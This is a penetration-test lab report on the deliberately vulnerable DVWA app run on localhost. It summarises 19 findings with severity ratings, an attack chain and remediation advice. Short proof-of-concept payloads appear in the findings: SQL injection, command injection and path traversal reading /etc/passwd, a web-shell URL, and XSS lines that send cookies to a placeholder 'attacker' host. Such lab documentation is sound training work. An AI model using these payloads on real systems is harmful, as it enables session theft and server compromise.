# Lab Write-Up: Full Penetration Testing Report – DVWA
**Date:** 2026-10-03  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Assessment Type:** Web Application Penetration Test  
**Category:** Summary / Report Writing  
**OWASP Top 10:** Multiple Categories  

---

## 1. Executive Summary

This report documents the findings of a comprehensive penetration test conducted against the Damn Vulnerable Web Application (DVWA) in an isolated lab environment. The assessment was performed to identify security vulnerabilities across all DVWA modules at all security levels (Low, Medium, High), demonstrate exploitation techniques, and provide actionable remediation guidance.

**Assessment Period:** 2026-08-20 to 2026-10-01  
**Assessor:** Adinath Dubile  
**Environment:** Isolated lab — DVWA on Kali Linux (localhost)  

**Overall Risk Rating: CRITICAL**

A total of **19 vulnerabilities** were identified and exploited across all DVWA modules. All vulnerabilities were successfully exploited at the Low security level, with the majority also exploitable at Medium and High levels through bypass techniques. The application is significantly vulnerable to attacks that could result in complete system compromise.

---

## 2. Scope

| Item             | Details                                        |
|------------------|------------------------------------------------|
| **Target URL**   | `http://localhost/dvwa/`                       |
| **IP Address**   | `127.0.0.1` (localhost)                        |
| **Application**  | DVWA v1.10.1                                   |
| **Database**     | MariaDB 10.11.5                                |
| **Web Server**   | Apache 2.4.57                                  |
| **PHP Version**  | 8.2.7                                          |
| **Testing Type** | Gray box (source code available)               |
| **Rules of Engagement** | No production systems affected; isolated lab only |

---

## 3. Methodology

The assessment followed the **OWASP Web Security Testing Guide (WSTG)** methodology:

```
Phase 1: Reconnaissance & Enumeration
  → Nikto scanning, manual crawling, header analysis

Phase 2: Vulnerability Identification
  → Testing each DVWA module at all security levels

Phase 3: Exploitation
  → Confirming and demonstrating each vulnerability

Phase 4: Post-Exploitation
  → Session hijacking, privilege escalation, data extraction

Phase 5: Reporting
  → Documentation with PoC, severity ratings, remediation
```

---

## 4. Findings Summary

### 4.1 Findings by Severity

| Severity  | Count | Vulnerabilities |
|-----------|-------|-----------------|
| Critical  | 8     | SQLi, Blind SQLi, Command Injection, File Upload, File Inclusion, Directory Traversal, XXE, Session Hijacking |
| High      | 7     | Stored XSS, Reflected XSS, CSRF, Brute Force, Weak Session IDs, Insecure CAPTCHA, Authorisation Bypass |
| Medium    | 3     | DOM XSS, Open Redirect, CSP Bypass |
| Low       | 1     | JavaScript Attacks |

### 4.2 Findings by OWASP Category

| OWASP Category                              | Vulnerabilities Found |
|---------------------------------------------|-----------------------|
| A01 – Broken Access Control                 | Authorisation Bypass, Open Redirect, Directory Traversal |
| A02 – Cryptographic Failures                | Weak Session IDs, Password Cracking (MD5) |
| A03 – Injection                             | SQLi, Blind SQLi, Command Injection, File Inclusion, XSS (Reflected/Stored/DOM), XXE, CRLF |
| A04 – Insecure Design                       | File Upload, CSRF, Insecure CAPTCHA |
| A05 – Security Misconfiguration             | Missing Headers, Default Creds, phpinfo, Directory Listing |
| A07 – Identification/Authentication Failures| Brute Force, Session Hijacking, Weak IDs |

---

## 5. Detailed Findings

### FINDING-001: SQL Injection
**Severity:** Critical | **CVSS:** 9.8  
**Location:** `/dvwa/vulnerabilities/sqli/`  
**Description:** Direct SQL injection via the `id` parameter. UNION-based extraction of all credentials.  
**PoC:** `1' UNION SELECT user, password FROM users#`  
**Write-up:** `2026_08_20_SQL_Injection.md`

---

### FINDING-002: Reflected XSS
**Severity:** High | **CVSS:** 7.4  
**Location:** `/dvwa/vulnerabilities/xss_r/`  
**Description:** Reflected XSS via `name` parameter, allows cookie theft.  
**PoC:** `<svg/onload=window.location='http://attacker/?c='+document.cookie>`  
**Write-up:** `2026_08_22_XSS_Reflected.md`

---

### FINDING-003: Stored XSS
**Severity:** Critical | **CVSS:** 9.0  
**Location:** `/dvwa/vulnerabilities/xss_s/` (Guestbook)  
**Description:** Persistent XSS in guestbook — executes for all visitors.  
**PoC:** `<script>new Image().src='http://attacker/?c='+document.cookie</script>`  
**Write-up:** `2026_08_24_XSS_Stored.md`

---

### FINDING-004: Command Injection
**Severity:** Critical | **CVSS:** 10.0  
**Location:** `/dvwa/vulnerabilities/exec/`  
**Description:** OS command injection via ping utility — full RCE.  
**PoC:** `127.0.0.1; cat /etc/passwd`  
**Write-up:** `2026_08_26_Command_Injection.md`

---

### FINDING-005: File Upload
**Severity:** Critical | **CVSS:** 10.0  
**Location:** `/dvwa/vulnerabilities/upload/`  
**Description:** Unrestricted file upload allows PHP web shell → RCE.  
**PoC:** Upload `shell.php`, access at `/hackable/uploads/shell.php?cmd=id`  
**Write-up:** `2026_08_28_File_Upload.md`

---

### FINDING-006: CSRF
**Severity:** High | **CVSS:** 8.8  
**Location:** `/dvwa/vulnerabilities/csrf/`  
**Description:** No CSRF token at Low level — password change via crafted GET request.  
**PoC:** `<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked123...">`  
**Write-up:** `2026_08_30_CSRF.md`

---

### FINDING-007: Brute Force
**Severity:** High | **CVSS:** 7.5  
**Location:** `/dvwa/vulnerabilities/brute/`  
**Description:** No rate limiting or lockout — Hydra cracked `admin:password` in seconds.  
**Write-up:** `2026_09_01_Brute_Force.md`

---

### FINDING-008: File Inclusion (LFI/RFI)
**Severity:** Critical | **CVSS:** 9.8  
**Location:** `/dvwa/vulnerabilities/fi/`  
**Description:** Arbitrary file inclusion via `page` parameter — read sensitive files and RCE via RFI.  
**PoC:** `?page=../../../../etc/passwd`  
**Write-up:** `2026_09_03_File_Inclusion.md`

---

### FINDING-009: Blind SQL Injection
**Severity:** Critical | **CVSS:** 9.8  
**Location:** `/dvwa/vulnerabilities/sqli_blind/`  
**Description:** Boolean-based blind SQLi — full DB version and credential extraction.  
**PoC:** `1' AND SUBSTRING((SELECT @@version),1,1)='1'#`  
**Write-up:** `2026_09_05_SQL_Injection_Blind.md`

---

### FINDING-010: DOM-Based XSS
**Severity:** High | **CVSS:** 7.4  
**Location:** `/dvwa/vulnerabilities/xss_d/`  
**Description:** Client-side XSS via URL fragment — bypasses server-side whitelist.  
**PoC:** `#<script>window.location='http://attacker/?c='+document.cookie</script>`  
**Write-up:** `2026_09_07_XSS_DOM.md`

---

### FINDING-011: Weak Session IDs
**Severity:** High | **CVSS:** 8.0  
**Location:** `/dvwa/vulnerabilities/weak_id/`  
**Description:** Sequential integer sessions (Low), Unix timestamps (Medium), MD5(counter) (High).  
**Write-up:** `2026_09_09_Weak_Session_IDs.md`

---

### FINDING-012: Insecure CAPTCHA
**Severity:** High | **CVSS:** 7.5  
**Location:** `/dvwa/vulnerabilities/captcha/`  
**Description:** CAPTCHA bypassed at all levels via step-skip, hidden field manipulation, hardcoded dev value.  
**Write-up:** `2026_09_11_Insecure_CAPTCHA.md`

---

### FINDING-013: JavaScript Attacks
**Severity:** Medium | **CVSS:** 6.5  
**Location:** `/dvwa/vulnerabilities/javascript/`  
**Description:** Client-side token generation fully reversible — submitted "success" at all levels.  
**Write-up:** `2026_09_13_JavaScript_Attacks.md`

---

### FINDING-014: Open Redirect
**Severity:** Medium | **CVSS:** 6.1  
**Location:** `/dvwa/vulnerabilities/redirect/`  
**Description:** Open redirect exploited at all levels for phishing attacks.  
**PoC:** `?redirect=https://evil.com?info.php`  
**Write-up:** `2026_09_15_Open_Redirect.md`

---

### FINDING-015: CSP Bypass
**Severity:** High | **CVSS:** 7.4  
**Location:** `/dvwa/vulnerabilities/csp/`  
**Description:** Static nonce (Medium) and JSONP callback injection (High) bypass CSP.  
**Write-up:** `2026_09_17_CSP_Bypass.md`

---

### FINDING-016: Authorisation Bypass
**Severity:** Critical | **CVSS:** 9.1  
**Location:** `/dvwa/vulnerabilities/authbypass/`  
**Description:** Low-privilege user modifies admin-only data at all levels via direct API access.  
**Write-up:** `2026_09_19_Authorisation_Bypass.md`

---

### FINDING-017: Password Cracking (MD5)
**Severity:** Critical | **CVSS:** 9.1  
**Location:** DVWA Database (via SQLi)  
**Description:** All 5 DVWA passwords cracked from unsalted MD5 hashes in <60 seconds.  
**Write-up:** `2026_09_21_Password_Cracking.md`

---

### FINDING-018: Security Misconfiguration
**Severity:** Critical (cumulative)  
**Location:** Entire DVWA application  
**Description:** Default creds, phpinfo.php exposed, 6 missing security headers, no HTTPS.  
**Write-up:** `2026_09_29_Security_Misconfiguration.md`

---

### FINDING-019: Directory Traversal
**Severity:** Critical | **CVSS:** 9.8  
**Location:** `/dvwa/vulnerabilities/fi/`  
**Description:** Path traversal reads arbitrary files — `/etc/passwd`, DB config, source code.  
**Write-up:** `2026_09_25_Directory_Traversal.md`

---

## 6. Risk Matrix

```
LIKELIHOOD →  Low        Medium      High
IMPACT  ↓
High    |  MEDIUM  |  HIGH     |  CRITICAL  |
Medium  |  LOW     |  MEDIUM   |  HIGH      |
Low     |  LOW     |  LOW      |  MEDIUM    |

DVWA Findings: Mostly HIGH LIKELIHOOD + HIGH IMPACT = CRITICAL
```

---

## 7. Attack Chain Summary

The following demonstrates how vulnerabilities chain together for maximum impact:

```
Step 1: Nikto scan → phpinfo.php found (Misconfiguration)
Step 2: phpinfo.php → DB credentials in env variables
Step 3: Brute force → admin:password confirmed (Brute Force)
Step 4: Logged in as admin → SQL Injection exploited
Step 5: SQL Injection → User table dumped (5 MD5 hashes)
Step 6: Hashcat → All passwords cracked in < 60 seconds
Step 7: Stored XSS → Cookie stealer deployed in guestbook
Step 8: Admin visits guestbook → Session cookie stolen
Step 9: Session token → Logged in as admin from attacker machine
Step 10: File Upload → PHP shell uploaded
Step 11: Shell access → Reverse shell to Kali established
Step 12: RCE → Full server compromise
```

---

## 8. Recommendations Summary

### Immediate Actions (Critical):
1. Change all default credentials
2. Implement parameterized queries for all database interactions
3. Disable PHP command execution functions (`exec`, `shell_exec`, `system`)
4. Restrict file upload to images only with server-side validation
5. Add HttpOnly, Secure, SameSite flags to all cookies

### Short-Term (High):
1. Implement CSRF tokens on all state-changing forms
2. Add rate limiting and account lockout to login forms
3. Use bcrypt/Argon2id for password hashing
4. Enable all security headers (CSP, HSTS, X-Frame-Options)
5. Remove phpinfo.php and restrict setup.php

### Long-Term (Medium):
1. Implement a Web Application Firewall (ModSecurity)
2. Enable HTTPS with TLS 1.3
3. Conduct regular security assessments
4. Implement a vulnerability management program
5. Train developers on secure coding practices

---

## 9. Conclusion

The DVWA application is intentionally vulnerable to demonstrate the most critical web application security flaws. This assessment successfully identified and exploited 19 vulnerabilities across all modules and security levels. The findings cover 6 of the OWASP Top 10 categories and demonstrate how chaining multiple lower-severity vulnerabilities can lead to complete system compromise.

All testing was conducted in an isolated lab environment. The techniques documented here are for educational and portfolio purposes only.

---

## 10. References

- [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [DVWA GitHub Repository](https://github.com/digininja/DVWA)
- [Penetration Testing Execution Standard (PTES)](http://www.pentest-standard.org/)

---

*Report created for portfolio/educational purposes only. All testing performed in an isolated lab environment with no real systems affected.*
